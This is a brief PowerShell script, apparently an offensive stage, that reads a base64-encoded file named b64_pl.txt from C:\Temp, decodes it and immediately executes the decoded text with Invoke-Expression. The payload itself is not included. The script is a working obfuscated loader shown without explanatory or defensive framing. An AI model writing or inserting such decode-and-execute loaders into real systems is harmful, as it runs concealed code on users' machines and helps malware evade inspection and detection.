function b64-convert-back()
{
$b64_main=(Get-Content "C:\Temp\b64_pl.txt" -Raw);$plain=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64_main));iex $plain
}

b64-convert-back